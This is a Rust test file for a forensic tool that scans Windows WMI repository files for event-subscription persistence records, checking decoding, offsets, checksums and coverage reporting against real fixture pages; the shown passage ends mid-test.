//! Tests for the WMI repository record scan.
//!
//! The fixtures are whole pages copied verbatim from two real `OBJECTS.DATA`
//! files (`tests/fixtures/wmi/MANIFEST.json` names the source images and the
//! page numbers). Every expected value below was read off those pages with
//! `strings -t x` and a separate Python decoder before this module's decoder
//! existed, so a test cannot pass by agreeing with its own output.

use crate::wmi::{
    scan, scan_with_mapping, ChecksumStatus, DecodeStatus, HashForm, PageState, PropState,
    PropValue, RecordProvenance, WmiRecord, PAGE_SIZE,
};
use crate::AsepEnumerator;
use seance_core::artifact::{Artifact, ArtifactType};
use seance_core::data_source::{ByteSliceDataSource, DataSource};
use seance_core::module::ForensicsModule;
use serde_json::{json, Value};
use std::sync::Arc;
use uuid::Uuid;

const LONEWOLF: &[u8] = include_bytes!("../tests/fixtures/wmi/lonewolf-win10-objects-pages.bin");
const CFREDS_XP: &[u8] = include_bytes!("../tests/fixtures/wmi/cfreds-xp-objects-pages.bin");

fn source(bytes: Vec<u8>) -> Option<Arc<dyn DataSource>> {
    Some(Arc::new(ByteSliceDataSource::new(bytes)) as Arc<dyn DataSource>)
}

fn prop<'a>(rec: &'a WmiRecord, name: &str) -> &'a PropValue {
    &rec.properties
        .iter()
        .find(|p| p.name == name)
        .unwrap_or_else(|| panic!("{} has no property {name}", rec.class_name))
        .value
}

fn state(rec: &WmiRecord, name: &str) -> PropState {
    rec.properties
        .iter()
        .find(|p| p.name == name)
        .unwrap_or_else(|| panic!("{} has no property {name}", rec.class_name))
        .state
}

fn text<'a>(rec: &'a WmiRecord, name: &str) -> &'a str {
    match prop(rec, name) {
        PropValue::Str(s) => s,
        other => panic!("{name} is {other:?}, not a string"),
    }
}

fn by_class<'a>(records: &'a [WmiRecord], class: &str) -> Vec<&'a WmiRecord> {
    records
        .iter()
        .filter(|r| r.class_name.eq_ignore_ascii_case(class))
        .collect()
}

// --- the Windows 10 repository (Lone Wolf) ----------------------------------

#[test]
fn the_lonewolf_pages_yield_exactly_the_scm_event_log_triad() {
    let out = scan(LONEWOLF);
    let decoded: Vec<&WmiRecord> = out
        .records
        .iter()
        .filter(|r| matches!(r.decode, DecodeStatus::Decoded { .. }))
        .collect();
    assert_eq!(
        decoded.len(),
        3,
        "one filter, one consumer, one binding: {:?}",
        out.records
            .iter()
            .map(|r| (&r.class_name, r.offset, &r.decode))
            .collect::<Vec<_>>()
    );

    // Offsets: source page 143 is the 6th page of the fixture (index 5), and the
    // page's descriptor table places the three records at 0xf7a, 0x10b5 and
    // 0x11e0 within it.
    let page_base = 5 * PAGE_SIZE;

    let filter = by_class(&out.records, "__EventFilter");
    assert_eq!(filter.len(), 1);
    let filter = filter[0];
    assert_eq!(filter.offset, page_base + 0x10b5);
    assert_eq!(filter.size, 0x12b);
    assert_eq!(filter.record_id, Some(0x1c18_8ffb));
    assert_eq!(filter.hash_form, HashForm::Sha256);
    assert_eq!(filter.provenance, RecordProvenance::AllocatedPageRecord);
    assert_eq!(text(filter, "Name"), "SCM Event Log Filter");
    assert_eq!(text(filter, "Query"), "select * from MSFT_SCMEventLogEvent");
    assert_eq!(text(filter, "QueryLanguage"), "WQL");
    assert_eq!(text(filter, "EventNamespace"), "root\\cimv2");
    assert_eq!(prop(filter, "EventAccess"), &PropValue::Null);
    assert_eq!(state(filter, "EventAccess"), PropState::Null);
    assert_eq!(filter.creator_sid.as_deref(), Some("S-1-5-32-544"));
    // FILETIMEs read straight off the record at 0x11f135 and 0x11f13d.
    assert_eq!(filter.filetime_a, 0x01d3_3929_a8a4_f16e);
    assert_eq!(filter.filetime_b, 0x01d3_3929_a8a4_ebdd);

    let consumer = by_class(&out.records, "NTEventLogEventConsumer");
    assert_eq!(consumer.len(), 1);
    let consumer = consumer[0];
    assert_eq!(consumer.offset, page_base + 0xf7a);
    assert_eq!(consumer.size, 0x13b);
    assert_eq!(text(consumer, "Name"), "SCM Event Log Consumer");
    assert_eq!(text(consumer, "SourceName"), "Service Control Manager");
    // The class definition (index 12, value offset 0x2e) puts "sid" in
    // NameOfUserSIDProperty; NameOfRawDataProperty (index 11) is null.
    assert_eq!(text(consumer, "NameOfUserSIDProperty"), "sid");
    assert_eq!(prop(consumer, "NameOfRawDataProperty"), &PropValue::Null);
    assert_eq!(prop(consumer, "EventType"), &PropValue::Unsigned(1));
    assert_eq!(state(consumer, "EventType"), PropState::Stored);
    // EventID is not stored on the instance; the class default (0) applies.
    assert_eq!(prop(consumer, "EventID"), &PropValue::Unsigned(0));
    assert_eq!(state(consumer, "EventID"), PropState::ClassDefault);
    assert_eq!(prop(consumer, "MachineName"), &PropValue::Null);
    assert_eq!(prop(consumer, "UNCServerName"), &PropValue::Null);
    assert_eq!(consumer.creator_sid.as_deref(), Some("S-1-5-32-544"));

    let binding = by_class(&out.records, "__FilterToConsumerBinding");
    assert_eq!(binding.len(), 1);
    let binding = binding[0];
    assert_eq!(binding.offset, page_base + 0x11e0);
    assert_eq!(binding.size, 0x14b);
    assert_eq!(
        text(binding, "Filter"),
        "__EventFilter.Name=\"SCM Event Log Filter\""
    );
    assert_eq!(
        text(binding, "Consumer"),
        "NTEventLogEventConsumer.Name=\"SCM Event Log Consumer\""
    );
    assert_eq!(prop(binding, "DeliveryQoS"), &PropValue::Null);
    assert_eq!(
        prop(binding, "DeliverSynchronously"),
        &PropValue::Bool(false)
    );
    assert_eq!(
        state(binding, "DeliverSynchronously"),
        PropState::ClassDefault
    );
    assert_eq!(binding.creator_sid.as_deref(), Some("S-1-5-32-544"));
}

#[test]
fn a_windows_10_record_stores_no_checksum_and_the_record_says_so() {
    let out = scan(LONEWOLF);
    for rec in &out.records {
        assert_eq!(
            rec.checksum,
            ChecksumStatus::NotStored,
            "{} at {:#x}: a zero checksum field is 'not stored', never 'verified'",
            rec.class_name,
            rec.offset
        );
    }
}

#[test]
fn a_hash_string_inside_another_record_is_counted_but_never_reported_as_an_instance() {
    // The binding's class hash also appears twice inside two larger records on
    // the same page (a key path that names the class), at 0xb42d and 0xb639.
    let out = scan(LONEWOLF);
    assert_eq!(out.summary.signature_hits, 5);
    assert_eq!(out.summary.hits_inside_other_records, 2);
    assert_eq!(out.summary.unreferenced_hits, 0);
    assert_eq!(out.summary.instance_records_matched, 3);
    assert!(out
        .records
        .iter()
        .all(|r| r.provenance == RecordProvenance::AllocatedPageRecord));
}

#[test]
fn the_scan_reports_what_it_covered_in_numbers() {
    let out = scan(LONEWOLF);
    assert_eq!(out.summary.bytes_scanned, LONEWOLF.len());
    assert_eq!(out.summary.pages, 9);
    assert_eq!(out.summary.descriptor_records, 143);
    assert_eq!(out.summary.records_decoded, 3);
    assert_eq!(out.summary.records_undecodable, 0);
    assert!(!out.summary.capped);
}

#[test]
fn class_layouts_are_read_from_the_repository_itself_not_from_a_table_in_the_code() {
    let out = scan(LONEWOLF);
    // Both ActiveScriptEventConsumer definitions in the file are collected: the
    // root\subscription one with a Name key and the older one without.
    let active = out
        .layouts
        .get("ActiveScriptEventConsumer")
        .expect("class definitions found");
    let mut shapes: Vec<Vec<(&str, u32)>> = active
        .iter()
        .map(|l| {
            l.own
                .iter()
                .map(|p| (p.name.as_str(), p.offset))
                .collect::<Vec<_>>()
        })
        .collect();
    shapes.sort();
    shapes.dedup();
    assert_eq!(
        shapes,
        vec![
            vec![
                ("Name", 0x0c),
                ("ScriptingEngine", 0x10),
                ("ScriptText", 0x14),
                ("ScriptFilename", 0x18),
                ("KillTimeout", 0x1c),
            ],
            vec![
                ("ScriptingEngine", 0x0c),
                ("ScriptText", 0x10),
                ("ScriptFilename", 0x14),
                ("KillTimeout", 0x18),
            ],
        ]
    );
    let cmd = &out.layouts["CommandLineEventConsumer"][0];
    assert_eq!(cmd.superclass, "__EventConsumer");
    let template = cmd
        .own
        .iter()
        .find(|p| p.name == "CommandLineTemplate")
        .unwrap();
    assert_eq!((template.index, template.offset), (5, 0x14));
    let kill = cmd.own.iter().find(|p| p.name == "KillTimeout").unwrap();
    assert_eq!((kill.index, kill.offset), (26, 0x58));

    // The decoded records name the definition they were read with.
    let filter = &by_class(&out.records, "__EventFilter")[0];
    match &filter.decode {
        DecodeStatus::Decoded { layout_offset } => {
            assert_eq!(
                *layout_offset,
                PAGE_SIZE + 0xeda,
                "__EventFilter is defined on page 1"
            )
        }
        other => panic!("{other:?}"),
    }
}

// --- the Windows XP repository (CFReDS hacking case) -------------------------

#[test]
fn the_xp_pages_yield_two_subscriptions_under_the_md5_hash_form() {
    let out = scan(CFREDS_XP);
    assert!(out.records.iter().all(|r| r.hash_form == HashForm::Md5));

    let filters = by_class(&out.records, "__EventFilter");
    assert_eq!(filters.len(), 2);
    let scm = filters
        .iter()
        .find(|f| text(f, "Name") == "SCM Event Log Filter")
        .expect("the SCM filter");
    assert_eq!(scm.offset, 2 * PAGE_SIZE + 0xc59);
    assert_eq!(text(scm, "Query"), "select * from MSFT_SCMEventLogEvent");
    assert_eq!(text(scm, "EventNamespace"), "root\\cimv2");
    // The XP SCM filter stores no CreatorSID of its own: the state bits say the
    // class default applies, and the __EventFilter definition's default block
    // carries S-1-5-18.
    assert_eq!(state(scm, "CreatorSID"), PropState::ClassDefault);
    assert_eq!(scm.creator_sid.as_deref(), Some("S-1-5-18"));

    let uc = filters
        .iter()
        .find(|f| text(f, "Name") == "Microsoft WMI Updating Consumer Scenario Control")
        .expect("the updating-consumer filter on page 328");
    assert_eq!(uc.offset, 4 * PAGE_SIZE + 0x45d);
    assert_eq!(
        text(uc, "Query"),
        "SELECT * FROM __InstanceOperationEvent WHERE TargetInstance ISA 'MSFT_UCScenario'"
    );
    assert_eq!(text(uc, "QueryLanguage"), "WQL");

    let bindings = by_class(&out.records, "__FilterToConsumerBinding");
    assert_eq!(bindings.len(), 2);
    let uc_binding = bindings
        .iter()
        .find(|b| text(b, "Consumer").contains("MSFT_UCScenarioControl"))
        .expect("the updating-consumer binding");
    assert_eq!(uc_binding.offset, 4 * PAGE_SIZE + 0x572);
    assert_eq!(
        text(uc_binding, "Filter"),
        "\\\\.\\root\\subscription:__EventFilter.Name=\"Microsoft WMI Updating Consumer Scenario Control\""
    );
    assert_eq!(
        prop(uc_binding, "DeliverSynchronously"),
        &PropValue::Bool(true),
        "0xffff at values offset 0x0c is a stored TRUE"
    );
    assert_eq!(state(uc_binding, "DeliverSynchronously"), PropState::Stored);

    let consumers = by_class(&out.records, "NTEventLogEventConsumer");
    assert_eq!(consumers.len(), 1);
    assert_eq!(consumers[0].offset, 2 * PAGE_SIZE + 0xb72);
    assert_eq!(text(consumers[0], "Name"), "SCM Event Log Consumer");
}

#[test]
fn xp_record_checksums_are_verified_against_the_descriptor() {
    let out = scan(CFREDS_XP);
    assert!(!out.records.is_empty());
    for rec in &out.records {
        assert_eq!(
            rec.checksum,
            ChecksumStatus::Verified,
            "{} at {:#x}",
            rec.class_name,
            rec.offset
        );
    }
}

#[test]
fn a_consumer_class_named_only_by_a_binding_is_added_to_the_scan_and_its_absence_is_reported() {
    // The XP binding names MSFT_UCScenarioControl, which is not one of the
    // standard consumer classes. Its definition is on page 328, in the fixture;
    // its one instance record is on page 359, which the fixture leaves out, so
    // here the class is scanned for and not found. The whole-file test below
    // shows the same scan finding it.
    let out = scan(CFREDS_XP);
    assert!(out
        .summary
        .classes_added_from_bindings
        .iter()
        .any(|c| c == "MSFT_UCScenarioControl"));
    assert!(out.layouts.contains_key("MSFT_UCScenarioControl"));
    assert!(by_class(&out.records, "MSFT_UCScenarioControl").is_empty());
}

// --- undecodable and recovered forms ----------------------------------------

/// A page whose descriptor table lists the real SCM filter record and nothing
/// else, so no class definition is reachable. The bytes of the record are the
/// real ones from the Lone Wolf page; the page around them is built here.
fn page_with_only(record: &[u8]) -> Vec<u8> {
    let mut page = vec![0u8; PAGE_SIZE];
    let off = 0x100u32;
    page[0..4].copy_from_slice(&0x1234_5678u32.to_le_bytes());
    page[4..8].copy_from_slice(&off.to_le_bytes());
    page[8..12].copy_from_slice(&(record.len() as u32).to_le_bytes());
    page[off as usize..off as usize + record.len()].copy_from_slice(record);
    page
}

fn lonewolf_filter_bytes() -> &'static [u8] {
    let start = 5 * PAGE_SIZE + 0x10b5;
    &LONEWOLF[start..start + 0x12b]
}

#[test]
fn a_record_whose_class_definition_is_absent_is_reported_undecoded_with_its_strings() {
    let page = page_with_only(lonewolf_filter_bytes());
    let out = scan(&page);
    assert_eq!(out.records.len(), 1);
    let rec = &out.records[0];
    assert_eq!(rec.class_name, "__EventFilter");
    match &rec.decode {
        DecodeStatus::Undecodable(reason) => {
            assert!(reason.contains("class definition"), "{reason}");
        }
        other => panic!("must not decode without a layout: {other:?}"),
    }
    assert!(rec.properties.is_empty());
    assert!(
        rec.data_strings
            .iter()
            .any(|s| s == "select * from MSFT_SCMEventLogEvent"),
        "the strings the record holds are still evidence: {:?}",
        rec.data_strings
    );
    assert_eq!(out.summary.records_undecodable, 1);
}

#[test]
fn an_instance_in_bytes_no_descriptor_points_at_is_a_recovered_record_not_a_live_one() {
    // The real filter record copied into page slack, after the descriptor
    // table's terminator, with a copy of page 1 (the class definitions) so it
    // can be decoded. Its type must say recovered; its checksum status must not
    // claim a verification that never happened.
    let mut buf = LONEWOLF[..2 * PAGE_SIZE].to_vec();
    let mut page = vec![0u8; PAGE_SIZE];
    let rec = lonewolf_filter_bytes();
    page[0x2000 - rec.len() - 16..0x2000 - 16].copy_from_slice(rec);
    buf.extend_from_slice(&page);
    let out = scan(&buf);
    let rec = out
        .records
        .iter()
        .find(|r| r.class_name == "__EventFilter")
        .expect("found by signature");
    assert_eq!(rec.provenance, RecordProvenance::UnreferencedBytes);
    assert_eq!(rec.record_id, None);
    assert_eq!(rec.checksum, ChecksumStatus::NotApplicable);
    assert!(matches!(rec.decode, DecodeStatus::Decoded { .. }));
    assert_eq!(text(rec, "Name"), "SCM Event Log Filter");
    assert_eq!(out.summary.unreferenced_hits, 1);
}

#[test]
fn a_record_that_runs_past_its_page_is_matched_but_its_continuation_is_not_invented() {
    let rec = lonewolf_filter_bytes();
    let mut page = vec![0u8; PAGE_SIZE];
    let off = PAGE_SIZE - 0x90; // room for the hash and timestamps only
    page[0..4].copy_from_slice(&1u32.to_le_bytes());
    page[4..8].copy_from_slice(&(off as u32).to_le_bytes());
    page[8..12].copy_from_slice(&(rec.len() as u32).to_le_bytes());
    page[off..].copy_from_slice(&rec[..PAGE_SIZE - off]);
    let out = scan(&page);
    assert_eq!(out.records.len(), 1);
    let r = &out.records[0];
    assert!(r.spans_pages);
    match &r.decode {
        DecodeStatus::Undecodable(reason) => assert!(reason.contains("page"), "{reason}"),
        other => panic!("{other:?}"),
    }
}

/// A page whose descriptor table lists one record declaring a size past the
/// page end, with the record's opening bytes in place.
fn page_with_a_spanning_descriptor() -> Vec<u8> {
    let rec = lonewolf_filter_bytes();
    let mut page = vec![0u8; PAGE_SIZE];
    let off = PAGE_SIZE - 0x90;
    page[0..4].copy_from_slice(&1u32.to_le_bytes());
    page[4..8].copy_from_slice(&(off as u32).to_le_bytes());
    page[8..12].copy_from_slice(&(rec.len() as u32).to_le_bytes());
    page[off..].copy_from_slice(&rec[..PAGE_SIZE - off]);
    page
}

/// A descriptor whose size runs past its page is never tried as a class
/// definition (its continuation lives in a page only the mapping can name).
/// That is a "could not look", and the scan's numbers must carry it: how many
/// descriptors were skipped that way, and how many were tried.
#[test]
fn a_descriptor_that_runs_past_its_page_is_counted_as_not_tried_as_a_class_definition() {
    let mut buf = LONEWOLF.to_vec();
    buf.extend_from_slice(&page_with_a_spanning_descriptor());
    let out = scan(&buf);
    assert_eq!(out.summary.descriptor_records, 144);
    assert_eq!(out.summary.descriptors_spanning_pages, 1);
    assert_eq!(out.summary.descriptors_tried_as_class_definitions, 143);

    let out = scan(LONEWOLF);
    assert_eq!(out.summary.descriptors_spanning_pages, 0);
    assert_eq!(out.summary.descriptors_tried_as_class_definitions, 143);
}

#[test]
fn a_file_shorter_than_one_page_or_empty_scans_to_nothing_and_says_so() {
    let out = scan(&[]);
    assert_eq!(out.summary.pages, 0);
    assert!(out.records.is_empty());
    let out = scan(&[0u8; 100]);
    assert_eq!(out.summary.pages, 0);
    assert_eq!(out.summary.bytes_scanned, 100);
}

// --- through the module ------------------------------------------------------

fn objects_data_artifact(bytes: &[u8], path: &str) -> Artifact {
    Artifact::new(
        Uuid::new_v4(),
        ArtifactType::FileEntry,
        source(bytes.to_vec()),
        json!({"name": "OBJECTS.DATA", "path": path}),
    )
}

fn entries<'a>(produced: &'a [Artifact], ty: &str) -> Vec<&'a Artifact> {
    produced
        .iter()
        .filter(|a| a.metadata.get("type").and_then(Value::as_str) == Some(ty))
        .collect()
}

#[test]
fn the_repository_file_becomes_one_entry_per_record_and_a_coverage_record() {
    let module = AsepEnumerator::new();
    let art = objects_data_artifact(LONEWOLF, "/Windows/System32/wbem/Repository/OBJECTS.DATA");
    let produced = module.process(&art).expect("process");
    let rows = entries(&produced, "AsepEntry");
    assert_eq!(rows.len(), 3);
    for row in &rows {
        assert_eq!(
            row.metadata.get("category").and_then(Value::as_str),
            Some("wmi_event_subscription")
        );
        assert_eq!(
            row.metadata.get("evidence_state").and_then(Value::as_str),
            Some("allocated_record")
        );
        assert_eq!(
            row.metadata.get("read_status").and_then(Value::as_str),
            Some("parsed")
        );
        let basis = row
            .metadata
            .get("scan_basis")
            .and_then(Value::as_str)
            .unwrap_or_default();
        assert!(
            basis.contains("record-level scan") && basis.contains("INDEX.BTR"),
            "every record states how it was found and what was not read: {basis}"
        );
        assert!(row
            .metadata
            .get("record_offset")
            .and_then(Value::as_u64)
            .is_some());
    }

    let binding = rows
        .iter()
        .find(|r| {
            r.metadata.get("wmi_record_class").and_then(Value::as_str)
                == Some("__FilterToConsumerBinding")
        })
        .expect("the binding entry");
    assert_eq!(
        binding.metadata.get("entry_name").and_then(Value::as_str),
        Some("SCM Event Log Filter -> SCM Event Log Consumer")
    );
    assert_eq!(
        binding
            .metadata
            .get("binding_filter_resolved")
            .and_then(Value::as_bool),
        Some(true)
    );
    assert_eq!(
        binding
            .metadata
            .get("binding_consumer_resolved")
            .and_then(Value::as_bool),
        Some(true)
    );
    let runs_when = binding
        .metadata
        .get("runs_when")
        .and_then(Value::as_str)
        .unwrap_or_default();
    assert!(
        runs_when.contains("select * from MSFT_SCMEventLogEvent"),
        "{runs_when}"
    );
    assert!(runs_when.contains("NTEventLogEventConsumer"), "{runs_when}");
    assert!(
        binding.metadata.get("image_path").is_none()
            || binding.metadata.get("image_path").unwrap().is_null(),
        "an event-log consumer executes nothing, so no image may be claimed"
    );
    // The later of the record's two FILETIMEs is a record time, not an install
    // time (`HUNT-195`: planted instances on a Windows 11 repository carry a time
    // before they were created), and it is labelled as that.
    assert_eq!(
        binding.metadata.get("installed_time"),
        Some(&Value::Null),
        "a WMI record time is not claimed as the time the subscription was installed"
    );
    assert_eq!(
        binding.metadata.get("installed_time_status"),
        Some(&json!("unavailable"))
    );
    assert_eq!(
        binding
            .metadata
            .get("record_time_source")
            .and_then(Value::as_str),
        Some("wmi_record_filetime_later_of_two")
    );
    assert_eq!(
        binding.metadata.get("record_time").and_then(Value::as_str),
        Some("2017-09-29T13:48:40.970071900+00:00")
    );

    let coverage = entries(&produced, "AsepCoverage");
    assert_eq!(coverage.len(), 1);
    let cov = &coverage[0].metadata;
    assert_eq!(
        cov.get("hive").and_then(Value::as_str),
        Some("OBJECTS.DATA")
    );
    assert_eq!(
        cov.get("hive_kind").and_then(Value::as_str),
        Some("WMI_REPOSITORY")
    );
    let rows = cov.get("categories").and_then(Value::as_array).unwrap();
    let wmi = rows
        .iter()
        .find(|r| r.get("category").and_then(Value::as_str) == Some("wmi_event_subscription"))
        .unwrap();
    assert_eq!(wmi.get("status").and_then(Value::as_str), Some("examined"));
    assert_eq!(wmi.get("entries").and_then(Value::as_u64), Some(3));
    let scan = cov
        .get("wmi_scan")
        .expect("the scan statistics travel on the coverage record");
    assert_eq!(
        scan.get("bytes_scanned").and_then(Value::as_u64),
        Some(LONEWOLF.len() as u64)
    );
    assert_eq!(scan.get("records_matched").and_then(Value::as_u64), Some(3));
    assert_eq!(
        scan.get("records_undecodable").and_then(Value::as_u64),
        Some(0)
    );
    assert_eq!(
        scan.get("index_walked").and_then(Value::as_bool),
        Some(false)
    );
    assert_eq!(
        scan.get("mapping_read").and_then(Value::as_bool),
        Some(false)
    );
    assert!(cov
        .get("unexamined_categories")
        .and_then(Value::as_array)
        .map(|a| a.is_empty())
        .unwrap_or(false));
}

#[test]
fn a_binding_whose_consumer_has_no_record_says_the_consumer_was_not_found_not_that_it_is_benign() {
    let module = AsepEnumerator::new();
    let art = objects_data_artifact(
        CFREDS_XP,
        "/WINDOWS/system32/wbem/Repository/FS/OBJECTS.DATA",
    );
    let produced = module.process(&art).expect("process");
    let rows = entries(&produced, "AsepEntry");
    assert_eq!(rows.len(), 5, "two filters, two bindings, one consumer");
    let uc = rows
        .iter()
        .find(|r| {
            r.metadata
                .get("entry_name")
                .and_then(Value::as_str)
                .map(|n| n.contains("Updating Consumer"))
                .unwrap_or(false)
                && r.metadata.get("wmi_record_class").and_then(Value::as_str)
                    == Some("__FilterToConsumerBinding")
        })
        .expect("the updating-consumer binding");
    assert_eq!(
        uc.metadata
            .get("binding_consumer_resolved")
            .and_then(Value::as_bool),
        Some(false)
    );
    assert_eq!(
        uc.metadata
            .get("binding_consumer_class")
            .and_then(Value::as_str),
        Some("MSFT_UCScenarioControl")
    );
    let runs_when = uc
        .metadata
        .get("runs_when")
        .and_then(Value::as_str)
        .unwrap();
    assert!(runs_when.contains("not found"), "{runs_when}");
    assert_eq!(
        uc.metadata.get("incomplete").and_then(Value::as_bool),
        Some(true),
        "an unresolved consumer is an incomplete answer, not a complete benign one"
    );
}

#[test]
fn a_recovered_record_is_published_under_its_own_type() {
    let module = AsepEnumerator::new();
    let mut buf = LONEWOLF[..2 * PAGE_SIZE].to_vec();
    let mut page = vec![0u8; PAGE_SIZE];
    let rec = lonewolf_filter_bytes();
    page[0x2000 - rec.len() - 16..0x2000 - 16].copy_from_slice(rec);
    buf.extend_from_slice(&page);
    let art = objects_data_artifact(&buf, "/Windows/System32/wbem/Repository/OBJECTS.DATA");
    let produced = module.process(&art).expect("process");
    assert!(entries(&produced, "AsepEntry").is_empty());
    let recovered = entries(&produced, "RecoveredAsepEntry");
    assert_eq!(recovered.len(), 1);
    assert_eq!(
        recovered[0]
            .metadata
            .get("evidence_state")
            .and_then(Value::as_str),
        Some("recovered")
    );
}

#[test]
fn a_repository_file_with_no_content_is_reported_unread_not_empty() {
    let module = AsepEnumerator::new();
    let art = Artifact::new(
        Uuid::new_v4(),
        ArtifactType::FileEntry,
        None,
        json!({"name": "OBJECTS.DATA", "path": "/Windows/System32/wbem/Repository/OBJECTS.DATA"}),
    );
    let produced = module.process(&art).expect("process");
    assert!(entries(&produced, "AsepEntry").is_empty());
    let cov = entries(&produced, "AsepCoverage");
    assert_eq!(cov.len(), 1);
    let rows = cov[0]
        .metadata
        .get("categories")
        .and_then(Value::as_array)
        .unwrap();
    let wmi = rows
        .iter()
        .find(|r| r.get("category").and_then(Value::as_str) == Some("wmi_event_subscription"))
        .unwrap();
    assert_eq!(
        wmi.get("status").and_then(Value::as_str),
        Some("unexamined")
    );
}

/// The coverage record's numbers and prose both say how many descriptors
/// were not tried as class definitions because their size runs past the
/// page, so an examiner reading "no class definition found" on an entry can
/// see whether a definition might lie in a record the scan could not read.
#[test]
fn the_coverage_record_counts_and_states_the_descriptors_skipped_for_running_past_their_page() {
    let module = AsepEnumerator::new();
    let mut buf = LONEWOLF.to_vec();
    buf.extend_from_slice(&page_with_a_spanning_descriptor());
    let art = objects_data_artifact(&buf, "/Windows/System32/wbem/Repository/OBJECTS.DATA");
    let produced = module.process(&art).expect("process");
    let cov = entries(&produced, "AsepCoverage");
    assert_eq!(cov.len(), 1);
    let scan = cov[0].metadata.get("wmi_scan").unwrap();
    assert_eq!(
        scan.get("descriptor_records").and_then(Value::as_u64),
        Some(144)
    );
    assert_eq!(
        scan.get("descriptors_spanning_pages")
            .and_then(Value::as_u64),
        Some(1)
    );
    assert_eq!(
        scan.get("descriptors_tried_as_class_definitions")
            .and_then(Value::as_u64),
        Some(143)
    );
    let rows = cov[0]
        .metadata
        .get("categories")
        .and_then(Value::as_array)
        .unwrap();
    let wmi = rows
        .iter()
        .find(|r| r.get("category").and_then(Value::as_str) == Some("wmi_event_subscription"))
        .unwrap();
    let reason = wmi.get("status_reason").and_then(Value::as_str).unwrap();
    assert!(
        reason.contains("1 of the 144 descriptor-listed record(s)")
            && reason.contains("not tried as class definitions"),
        "{reason}"
    );

    // With no spanning descriptor the sentence is absent: nothing was skipped.
    let art = objects_data_artifact(LONEWOLF, "/Windows/System32/wbem/Repository/OBJECTS.DATA");
    let produced = module.process(&art).expect("process");
    let cov = entries(&produced, "AsepCoverage");
    let rows = cov[0]
        .metadata
        .get("categories")
        .and_then(Value::as_array)
        .unwrap();
    let wmi = rows
        .iter()
        .find(|r| r.get("category").and_then(Value::as_str) == Some("wmi_event_subscription"))
        .unwrap();
    let reason = wmi.get("status_reason").and_then(Value::as_str).unwrap();
    assert!(
        !reason.contains("not tried as class definitions"),
        "{reason}"
    );
}

/// Only Windows 10 and Windows XP repositories were observed. A version range
/// a reference document gives ("XP/2003", "from Vista", "Windows 7 and
/// later") is not something this code has seen, so no emitted string may
/// carry one; the `locations_checked` list travels on every coverage record.
#[test]
fn emitted_strings_carry_no_windows_version_range_the_corpus_did_not_show() {
    let module = AsepEnumerator::new();
    for (bytes, path) in [
        (LONEWOLF, "/Windows/System32/wbem/Repository/OBJECTS.DATA"),
        (
            CFREDS_XP,
            "/WINDOWS/system32/wbem/Repository/FS/OBJECTS.DATA",
        ),
    ] {
        let art = objects_data_artifact(bytes, path);
        let produced = module.process(&art).expect("process");
        for a in &produced {
            let text = a.metadata.to_string();
            for label in ["2003", "Vista", "Windows 7 and later", "Windows 7 or later"] {
                assert!(!text.contains(label), "{label} in {text}");
            }
        }
    }
}

#[test]
fn an_objects_data_outside_the_repository_directory_is_not_scanned() {
    let module = AsepEnumerator::new();
    let art = objects_data_artifact(LONEWOLF, "/Users/x/Desktop/OBJECTS.DATA");
    let produced = module.process(&art).expect("process");
    assert!(produced.is_empty());
}

#[test]
fn the_per_hive_coverage_row_now_points_at_the_repository_scan_instead_of_declaring_the_category_unexamined(
) {
    use crate::coverage::{build_coverage_artifact, CoverageStatus, HiveScanSummary};
    use crate::rules::HiveKind;
    let summary = HiveScanSummary::new("SOFTWARE".to_string(), HiveKind::Software);
    let art = build_coverage_artifact(&summary, Uuid::new_v4(), Uuid::new_v4(), Uuid::new_v4());
    let rows = art
        .metadata
        .get("categories")
        .and_then(Value::as_array)
        .unwrap();
    let wmi = rows
        .iter()
        .find(|r| r.get("category").and_then(Value::as_str) == Some("wmi_event_subscription"))
        .unwrap();
    assert_eq!(
        wmi.get("status").and_then(Value::as_str),
        Some(CoverageStatus::ExaminedElsewhere.as_str())
    );
    let reason = wmi.get("status_reason").and_then(Value::as_str).unwrap();
    assert!(
        reason.contains("OBJECTS.DATA") && reason.contains("unexamined"),
        "{reason}"
    );
}

// --- consumer descriptions -----------------------------------------------------

fn synthetic_record(class: &str, props: &[(&str, PropValue)]) -> WmiRecord {
    use crate::wmi::{ChecksumStatus, Property};
    WmiRecord {
        offset: 0,
        size: 0,
        page: 0,
        record_id: None,
        provenance: RecordProvenance::AllocatedPageRecord,
        checksum: ChecksumStatus::NotStored,
        hash_form: HashForm::Sha256,
        class_name: class.to_string(),
        filetime_a: 0,
        filetime_b: 0,
        spans_pages: false,
        properties: props
            .iter()
            .map(|(n, v)| Property {
                name: n.to_string(),
                cim_type: "string".to_string(),
                state: PropState::Stored,
                value: v.clone(),
            })
            .collect(),
        creator_sid: None,
        data_strings: Vec::new(),
        data_strings_truncated: false,
        decode: DecodeStatus::Decoded { layout_offset: 0 },
        page_state: crate::wmi::PageState::MappingNotRead,
        reassembled: false,
        indexed: None,
        notes: Vec::new(),
    }
}

/// No real CommandLineEventConsumer instance exists in any repository on the
/// build host, so the *description* of one is tested on a record assembled
/// in memory. This tests only how a decoded record is described, never the
/// byte decoder, which is graded on the real records above.
#[test]
fn a_command_line_consumer_with_only_a_template_splits_the_image_from_the_arguments() {
    use crate::wmi::consumer_action;
    let rec = synthetic_record(
        "CommandLineEventConsumer",
        &[(
            "CommandLineTemplate",
            PropValue::Str("C:\\Windows\\System32\\cmd.exe /c start.bat".to_string()),
        )],
    );
    let action = consumer_action(&rec);
    assert_eq!(
        action.image.as_deref(),
        Some("C:\\Windows\\System32\\cmd.exe")
    );
    assert_eq!(action.arguments.as_deref(), Some("/c start.bat"));
    assert!(action.statement.contains("runs the command line"));

    let rec = synthetic_record(
        "CommandLineEventConsumer",
        &[
            (
                "ExecutablePath",
                PropValue::Str("C:\\Tools\\a.exe".to_string()),
            ),
            (
                "CommandLineTemplate",
                PropValue::Str("a.exe -q".to_string()),
            ),
        ],
    );
    let action = consumer_action(&rec);
    assert_eq!(action.image.as_deref(), Some("C:\\Tools\\a.exe"));
    assert_eq!(action.command.as_deref(), Some("a.exe -q"));
}

#[test]
fn an_active_script_consumer_reports_the_script_size_not_the_script_as_an_image() {
    use crate::wmi::consumer_action;
    let rec = synthetic_record(
        "ActiveScriptEventConsumer",
        &[
            ("ScriptingEngine", PropValue::Str("VBScript".to_string())),
            ("ScriptText", PropValue::Str("MsgBox 1".to_string())),
        ],
    );
    let action = consumer_action(&rec);
    assert_eq!(action.image, None);
    assert!(action.statement.contains("VBScript") && action.statement.contains("8 characters"));
    let rec = synthetic_record(
        "ActiveScriptEventConsumer",
        &[("ScriptFilename", PropValue::Str("C:\\s.vbs".to_string()))],
